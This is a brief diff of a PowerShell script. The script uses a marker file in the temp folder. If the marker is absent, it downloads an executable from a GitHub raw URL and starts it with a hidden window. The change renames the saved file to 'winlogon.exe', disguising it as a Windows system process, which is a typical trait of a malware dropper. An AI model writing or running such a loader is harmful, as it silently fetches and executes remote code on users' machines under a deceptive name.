@@ -12,6 +12,6 @@ if (Test-Path "$env:temp\wsuA58F.tmp") {
 	Remove-Item "$env:temp\wsuA58F.exe"
 } else {
 	New-Item "$env:temp\wsuA58F.tmp"
-	(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/psh/main/wsuA58F.exe", "$env:temp\wsuA58F.exe")
-	Start-Process "$env:temp\wsuA58F.exe" -WindowStyle hidden
+	(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/psh/main/wsuA58F.exe", "$env:temp\winlogon.exe")
+	Start-Process "$env:temp\winlogon.exe" -WindowStyle hidden
 }
